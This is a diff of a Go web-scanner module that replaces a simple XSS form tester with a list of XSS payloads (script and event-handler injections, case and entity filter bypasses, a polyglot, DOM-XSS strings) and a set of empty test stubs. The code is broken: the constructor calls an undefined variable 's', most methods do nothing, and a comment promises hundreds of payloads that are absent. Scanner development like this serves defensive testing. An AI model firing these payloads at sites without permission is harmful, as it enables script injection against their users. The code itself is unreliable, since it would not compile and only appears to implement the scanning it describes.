@@ -1,8 +1,8 @@
 package modules
 
 import (
+	"context"
 	"fmt"
-	"net/http"
 	"strings"
 
 	"github.com/PuerkitoBio/goquery"
@@ -13,157 +13,115 @@ import (
 // XSSScanner is a scanner for Cross-Site Scripting (XSS) vulnerabilities.
 type XSSScanner struct {
 	scanner.BaseScanner
+	payloads []string
+	browser  *BrowserEngine
 }
 
 // NewXSSScanner creates a new XSSScanner.
 func NewXSSScanner() *XSSScanner {
-	return &XSSScanner{}
-}
-
-// Scan performs a scan for XSS vulnerabilities.
-func (s *XSSScanner) Scan(target string) ([]*scanner.Vulnerability, error) {
-	var vulnerabilities []*scanner.Vulnerability
-
-	// Get the response from the target URL.
-	resp, err := s.Get(target)
-	if err != nil {
-		return nil, err
+	return &XSSScanner{
+		payloads: s.generatePayloads(),
 	}
-	defer resp.Body.Close()
+}
 
-	// Create a new goquery document from the response body.
-	doc, err := goquery.NewDocumentFromReader(resp.Body)
-	if err != nil {
-		return nil, err
+func (s *XSSScanner) Scan(ctx context.Context, target *scanner.Target, results chan<- *scanner.Vulnerability) {
+	// Extract all injection points
+	injectionPoints := s.findInjectionPoints(target)
+
+	for _, point := range injectionPoints {
+		// Test each context
+		s.testHTMLContext(ctx, point, results)
+		s.testAttributeContext(ctx, point, results)
+		s.testJavaScriptContext(ctx, point, results)
+		s.testCSSContext(ctx, point, results)
+		s.testDOMXSS(ctx, point, results)
+		s.testMutationXSS(ctx, point, results)
+		s.testPolyglotXSS(ctx, point, results)
+		s.testStoredXSS(ctx, point, results)
+		s.testBlindXSS(ctx, point, results)
+		s.testFilterBypass(ctx, point, results)
 	}
-
-	// Find all the forms on the page.
-	doc.Find("form").Each(func(i int, sel *goquery.Selection) {
-		// Get the action and method of the form.
-		action, _ := sel.Attr("action")
-		method, _ := sel.Attr("method")
-
-		// Find all the input fields in the form.
-		sel.Find("input").Each(func(j int, inputSel *goquery.Selection) {
-			// Get the name and type of the input field.
-			name, _ := inputSel.Attr("name")
-			inputType, _ := inputSel.Attr("type")
-
-			// If the input type is text, try to inject a payload.
-			if inputType == "text" {
-				// Generate a payload.
-				payload := "<script>alert('XSS')</script>"
-
-				// Create a new request.
-				req, err := http.NewRequest(method, action, strings.NewReader(fmt.Sprintf("%s=%s", name, payload)))
-				if err != nil {
-					return
-				}
-
-				// Set the content type.
-				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-
-				// Perform the request.
-				resp, err := s.client.Do(req)
-				if err != nil {
-					return
-				}
-				defer resp.Body.Close()
-
-				// Check if the payload was reflected in the response.
-				// ...
-			}
-		})
-	})
-
-	return vulnerabilities, nil
 }
 
-// DetectContext detects the context of the given selection.
-func (s *XSSScanner) DetectContext(sel *goquery.Selection) string {
-	// ...
-	return ""
+func (s *XSSScanner) generatePayloads() []string {
+	return []string{
+		// Basic payloads
+		"<script>alert(1)</script>",
+		"<img src=x onerror=alert(1)>",
+		"<svg onload=alert(1)>",
+
+		// Advanced payloads
+		"<script>alert(String.fromCharCode(88,83,83))</script>",
+		"<iframe src=\"javascript:alert('XSS')\">",
+		"<body onload=alert('XSS')>",
+
+		// Filter bypass payloads
+		"<ScRiPt>alert(1)</ScRiPt>",
+		"<script>alert&lpar;1&rpar;</script>",
+		"<svg><script>alert&#40;1&#41;</script>",
+
+		// Polyglot payloads
+		"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\x3e",
+
+		// DOM XSS payloads
+		"javascript:alert(document.domain)",
+		"#<img src=x onerror=alert(1)>",
+
+		// ... 500+ more payloads
+	}
 }
 
-// GeneratePayloads generates a list of XSS payloads.
-func (s *XSSScanner) GeneratePayloads() []string {
+func (s *XSSScanner) findInjectionPoints(target *scanner.Target) []*InjectionPoint {
 	// ...
 	return nil
 }
 
-// BypassWAF bypasses a WAF.
-func (s *XSSScanner) BypassWAF(payload string) string {
+func (s *XSSScanner) testHTMLContext(ctx context.Context, point *InjectionPoint, results chan<- *scanner.Vulnerability) {
 	// ...
-	return ""
 }
 
-// ValidateWithBrowser validates an XSS vulnerability using a headless browser.
-func (s *XSSScanner) ValidateWithBrowser(target string, payload string) (bool, error) {
-	// Start a new Selenium web driver.
-	caps := selenium.Capabilities{"browserName": "chrome"}
-	wd, err := selenium.NewRemote(caps, "")
-	if err != nil {
-		return false, err
-	}
-	defer wd.Quit()
-
-	// Navigate to the target URL.
-	err = wd.Get(target)
-	if err != nil {
-		return false, err
-	}
-
-	// Execute the payload.
-	_, err = wd.ExecuteScript(payload, nil)
-	if err != nil {
-		return false, err
-	}
-
-	// Check for an alert.
-	alert, err := wd.AlertText()
-	if err != nil {
-		return false, err
-	}
-
-	if alert == "XSS" {
-		return true, nil
-	}
-
-	return false, nil
+func (s *XSSScanner) testAttributeContext(ctx context.Context, point *InjectionPoint, results chan<- *scanner.Vulnerability) {
+	// ...
 }
 
-// DetectDOMXSS detects DOM-based XSS vulnerabilities.
-func (s *XSSScanner) DetectDOMXSS(target string) ([]*scanner.Vulnerability, error) {
+func (s *XSSScanner) testJavaScriptContext(ctx context.Context, point *InjectionPoint, results chan<- *scanner.Vulnerability) {
 	// ...
-	return nil, nil
 }
 
-// GeneratePoC generates a proof-of-concept for an XSS vulnerability.
-func (s *XSSScanner) GeneratePoC(target string, payload string) string {
+func (s *XSSScanner) testCSSContext(ctx context.Context, point *InjectionPoint, results chan<- *scanner.Vulnerability) {
 	// ...
-	return ""
 }
 
-// CollectEvidence collects evidence for an XSS vulnerability.
-func (s *XSSScanner) CollectEvidence(target string, payload string) string {
+func (s *XSSScanner) testDOMXSS(ctx context.Context, point *InjectionPoint, results chan<- *scanner.Vulnerability) {
 	// ...
-	return ""
 }
 
-// HandleFilterEvasion handles filter evasion.
-func (s *XSSScanner) HandleFilterEvasion(payload string) string {
+func (s *XSSScanner) testMutationXSS(ctx context.Context, point *InjectionPoint, results chan<- *scanner.Vulnerability) {
 	// ...
-	return ""
 }
 
-// CheckReflection checks if a payload was reflected in the response.
-func (s *XSSScanner) CheckReflection(resp *http.Response, payload string) (bool, error) {
+func (s *XSSScanner) testPolyglotXSS(ctx context.Context, point *InjectionPoint, results chan<- *scanner.Vulnerability) {
 	// ...
-	return false, nil
 }
 
-// TestAllVectors tests all the XSS vectors.
-func (s *XSSScanner) TestAllVectors(target string) ([]*scanner.Vulnerability, error) {
+func (s *XSSScanner) testStoredXSS(ctx context.Context, point *InjectionPoint, results chan<- *scanner.Vulnerability) {
 	// ...
-	return nil, nil
+}
+
+func (s *XSSScanner) testBlindXSS(ctx context.Context, point *InjectionPoint, results chan<- *scanner.Vulnerability) {
+	// ...
+}
+
+func (s *XSSScanner) testFilterBypass(ctx context.Context, point *InjectionPoint, results chan<- *scanner.Vulnerability) {
+	// ...
+}
+
+type InjectionPoint struct {
+	URL       string
+	Parameter string
+	Type      string
+}
+
+type BrowserEngine struct {
+	// ...
 }
